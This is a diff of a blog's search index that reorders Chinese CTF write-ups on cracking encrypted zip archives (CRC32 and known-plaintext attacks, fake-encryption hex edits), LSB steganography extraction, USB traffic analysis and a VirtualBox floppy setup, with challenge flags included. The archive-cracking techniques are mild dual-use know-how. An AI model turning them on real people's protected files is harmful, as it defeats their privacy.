+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image014.gif" class="" title="图片">
+
+<p>第四个压缩包l.zip</p>
+<p>打开就一个文件，可能会是伪加密，试试修改下16进制数据</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image016.gif" class="" title="图片">
+
+<p>能够解压</p>
+<p>这样四张分开的二维码图片就齐了，用PowerPoint拼起来看看，进行扫描</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image018.gif" class="" title="图片">
+
+<p>得到flag，flag{d62427d8f843c98dcfa89f0ba0d1e6fe}</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>misc笔记</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>java类加载器</title>
     <url>/2023/03/27/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
     <content><![CDATA[<h1 id="java基础学习"><a href="#java基础学习" class="headerlink" title="java基础学习"></a>java基础学习</h1><h3 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h3><p>java程序的运行是一个有意思的过程</p>
@@ -2000,102 +2048,6 @@
       </tags>
   </entry>
   <entry>
-    <title>各种压缩包的加密</title>
-    <url>/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/</url>
-    <content><![CDATA[<p>拿到附件，查看了下四个加密压缩包，貌似分别代表了不同的加密方式</p>
-<p>第一个a.zip</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image002.gif" class="" title="图片">
-
-<p>看了下有三个文件，1.txt，2.txt</p>
-<p>按照套路应该是CRC32爆破没错了，试试看</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image004.gif" class="" title="图片">
-
-<p>看到了两串很明显的字符，<em>pass_和_word</em></p>
-<p>所以压缩包密码应该就是_pass__word_，成功打开压缩包，得到1&#x2F;4张二维码，继续</p>
-<p>第二个f.zip</p>
-<p>根据压缩包的提示应该是可以直接爆破，先试试最常规的纯数字</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image006.gif" class="" title="图片">
-
-<p>五位数字爆破成功密码是61825</p>
-<p>第三个g.zip</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image008.gif" class="" title="图片">
-
-<p>根据文件名可以知道是明文爆破，这里由于会有一些压缩器的问题，所以就不分离出再进行压缩了，直接准备两个文件进行文件的删除</p>
-<p>删除到如下两幅图所示，相当于加密的和不加密的分离开</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image010.gif" class="" title="图片">
-
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image012.gif" class="" title="图片">
-
-<p>进行明文爆破，成功</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image014.gif" class="" title="图片">
-
-<p>第四个压缩包l.zip</p>
-<p>打开就一个文件，可能会是伪加密，试试修改下16进制数据</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image016.gif" class="" title="图片">
-
-<p>能够解压</p>
-<p>这样四张分开的二维码图片就齐了，用PowerPoint拼起来看看，进行扫描</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image018.gif" class="" title="图片">
-
-<p>得到flag，flag{d62427d8f843c98dcfa89f0ba0d1e6fe}</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>misc笔记</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于Oracle VM VirtualBox如何使用软驱的问题</title>
-    <url>/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>近期做到了一道题目，里面需要用到在虚拟机上挂载软盘的知识，查阅了一些资料，在这里进行一个总结。</p>
-<p>首先打开虚拟机，选择新建</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps7.jpg" class="" title="img"> 
-
-<p>在这里经过一些尝试，发现必须指定好系统的类型和版本，点击下一步，内存大小自定义，再下一步</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps8.jpg" class="" title="img"> 
-
-<p>在这里需要创建虚拟硬盘，下一步</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps9.jpg" class="" title="img"> 
-
-<p>直接下一步</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps10.jpg" class="" title="img"> 
-
-<p>给固定大小就行，下一步的文件位置和大小自定义，这样就创建好了</p>
-<p>再点击刚刚创建的虚拟机的设置</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps11.jpg" class="" title="img"> 
-
-<p>点击储存</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps12.jpg" class="" title="img"> 
-
-<p>点击左下方的加号</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps13.jpg" class="" title="img"> 
-
-<p>点击软盘，它就会多出了一个控制器</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps14.jpg" class="" title="img"> 
-
-<p>点击右方加号</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps15.jpg" class="" title="img"> 
-
-<p>点击注册</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps16.jpg" class="" title="img"> 
-
-<p>将自己的软盘放进去，点击ok保存就好</p>
-<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps17.jpg" class="" title="img"> 
-
-<p>最后将虚拟机启动就可以了</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>其它笔记</category>
-      </categories>
-      <tags>
-        <tag>其它</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>关于TCP与UDP协议的学习</title>
     <url>/2022/06/19/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<p>TCP协议的**<em>*<em>三次握手，传输确认，四次挥手*</em>*</em>*</p>
@@ -2156,6 +2108,54 @@
       </tags>
   </entry>
   <entry>
+    <title>关于Oracle VM VirtualBox如何使用软驱的问题</title>
+    <url>/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>近期做到了一道题目，里面需要用到在虚拟机上挂载软盘的知识，查阅了一些资料，在这里进行一个总结。</p>
+<p>首先打开虚拟机，选择新建</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps7.jpg" class="" title="img"> 
+
+<p>在这里经过一些尝试，发现必须指定好系统的类型和版本，点击下一步，内存大小自定义，再下一步</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps8.jpg" class="" title="img"> 
+
+<p>在这里需要创建虚拟硬盘，下一步</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps9.jpg" class="" title="img"> 
+
+<p>直接下一步</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps10.jpg" class="" title="img"> 
+
+<p>给固定大小就行，下一步的文件位置和大小自定义，这样就创建好了</p>
+<p>再点击刚刚创建的虚拟机的设置</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps11.jpg" class="" title="img"> 
+
+<p>点击储存</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps12.jpg" class="" title="img"> 
+
+<p>点击左下方的加号</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps13.jpg" class="" title="img"> 
+
+<p>点击软盘，它就会多出了一个控制器</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps14.jpg" class="" title="img"> 
+
+<p>点击右方加号</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps15.jpg" class="" title="img"> 
+
+<p>点击注册</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps16.jpg" class="" title="img"> 
+
+<p>将自己的软盘放进去，点击ok保存就好</p>
+<img src="/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/wps17.jpg" class="" title="img"> 
+
+<p>最后将虚拟机启动就可以了</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>其它笔记</category>
+      </categories>
+      <tags>
+        <tag>其它</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2022国赛初赛 misc ez_usb</title>
     <url>/2022/06/19/%E5%9B%BD%E8%B5%9B%20misc%20ez_usb/</url>
     <content><![CDATA[<p>下载附件，发现是usb的流量分析</p>
@@ -2191,7 +2191,7 @@
 <p>​    print(“     To use this python script , you must install the tshark first.”)</p>
 <p>​    print(“     You can use <code>sudo apt-get install tshark</code> to install it”)</p>
 <p>​    print(“Author : “)</p>
-<p>​    print(“     WangYihang <a href="mailto:&#119;&#x61;&#x6e;&#103;&#121;&#105;&#104;&#x61;&#x6e;&#103;&#101;&#114;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;">&#119;&#x61;&#x6e;&#103;&#121;&#105;&#104;&#x61;&#x6e;&#103;&#101;&#114;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;</a>“)</p>
+<p>​    print(“     WangYihang <a href="mailto:&#x77;&#x61;&#110;&#x67;&#x79;&#x69;&#104;&#x61;&#110;&#x67;&#x65;&#114;&#64;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;">&#x77;&#x61;&#110;&#x67;&#x79;&#x69;&#104;&#x61;&#110;&#x67;&#x65;&#114;&#64;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;</a>“)</p>
 <p>​    print(“     If you have any questions , please contact me by email.”)</p>
 <p>​    print(“     Thank you for using.”)</p>
 <p>​    exit(1)</p>
@@ -2274,6 +2274,57 @@
 
 <p>出了！，可以看清楚flag，左右移动一下，手动敲就出来了</p>
 <p>flag{607f41da-e849-4c0b-8867-1b3c74536cc4}</p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>强网青少赛miscWP</title>
+    <url>/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/</url>
+    <content><![CDATA[<h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>下载附件，发现是一张打不开的图片，拖进010看看</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image002.gif" class="" title="图片">
+
+<p>发现是base64码，先去在线网站解码看看</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image004.gif" class="" title="图片">
+
+<p>发现应该是一张png，但是每两位都被交换了位置，于是用脚本解码并转换16进制</p>
+<p>from binascii import *</p>
+<p>from base64 import *</p>
+<p>with open(‘chuyinweilai.png’, ‘r’) as f:</p>
+<p>  hexdata &#x3D; b64decode(f.read())</p>
+<p>  b_data &#x3D; b’’</p>
+<p>  for i in range(0, len(hexdata), 2):</p>
+<p>   data &#x3D; hexdata[i:i+2]</p>
+<p>   b_data +&#x3D; data[::-1]</p>
+<p>  with open(‘flag.png’, ‘wb’) as f1:</p>
+<p>   f1.write(b_data)</p>
+<p>得到图片</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image006.gif" class="" title="图片">
+
+<p>图片提示密钥就是音乐的财富密码，说明图片具有密钥，上网搜一下</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image008.gif" class="" title="图片">
+
+<p>密钥应该就是4536251，outguess和steghide都不是，想起来有个lsb解密也需要密钥，试一试</p>
+<p>python2 lsb.py extract flag.png 1.txt 4536251</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image010.gif" class="" title="图片">
+
+<p>得到1.txt，打开得到flag</p>
+<p>flag{5cc0aa21208b517dbd0bde650247237f}</p>
+<h1 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h1><p>下载附件</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image012.gif" class="" title="图片">
+
+<p>又是lsb隐写，先拖入010看看</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image014.gif" class="" title="图片">发现了一张png和password，先binwalk分离
+
+<p>有密码的图片，还是试试lsb.py</p>
+<p>python2 lsb.py extract secret.png 1.txt 7his_1s_p4s5w0rd</p>
+<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image016.gif" class="" title="图片">打开1.txt得到flag，
+
+<p>flag{2e55f884-ef01-4654-87b1-cc3111800085}</p>
 ]]></content>
       <categories>
         <category>比赛</category>
@@ -2452,57 +2503,6 @@
       <tags>
         <tag>misc</tag>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网青少赛miscWP</title>
-    <url>/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/</url>
-    <content><![CDATA[<h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>下载附件，发现是一张打不开的图片，拖进010看看</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image002.gif" class="" title="图片">
-
-<p>发现是base64码，先去在线网站解码看看</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image004.gif" class="" title="图片">
-
-<p>发现应该是一张png，但是每两位都被交换了位置，于是用脚本解码并转换16进制</p>
-<p>from binascii import *</p>
-<p>from base64 import *</p>
-<p>with open(‘chuyinweilai.png’, ‘r’) as f:</p>
-<p>  hexdata &#x3D; b64decode(f.read())</p>
-<p>  b_data &#x3D; b’’</p>
-<p>  for i in range(0, len(hexdata), 2):</p>
-<p>   data &#x3D; hexdata[i:i+2]</p>
-<p>   b_data +&#x3D; data[::-1]</p>
-<p>  with open(‘flag.png’, ‘wb’) as f1:</p>
-<p>   f1.write(b_data)</p>
-<p>得到图片</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image006.gif" class="" title="图片">
-
-<p>图片提示密钥就是音乐的财富密码，说明图片具有密钥，上网搜一下</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image008.gif" class="" title="图片">
-
-<p>密钥应该就是4536251，outguess和steghide都不是，想起来有个lsb解密也需要密钥，试一试</p>
-<p>python2 lsb.py extract flag.png 1.txt 4536251</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image010.gif" class="" title="图片">
-
-<p>得到1.txt，打开得到flag</p>
-<p>flag{5cc0aa21208b517dbd0bde650247237f}</p>
-<h1 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h1><p>下载附件</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image012.gif" class="" title="图片">
-
-<p>又是lsb隐写，先拖入010看看</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image014.gif" class="" title="图片">发现了一张png和password，先binwalk分离
-
-<p>有密码的图片，还是试试lsb.py</p>
-<p>python2 lsb.py extract secret.png 1.txt 7his_1s_p4s5w0rd</p>
-<img src="/2022/09/21/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9B(miscWP)/clip_image016.gif" class="" title="图片">打开1.txt得到flag，
-
-<p>flag{2e55f884-ef01-4654-87b1-cc3111800085}</p>
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
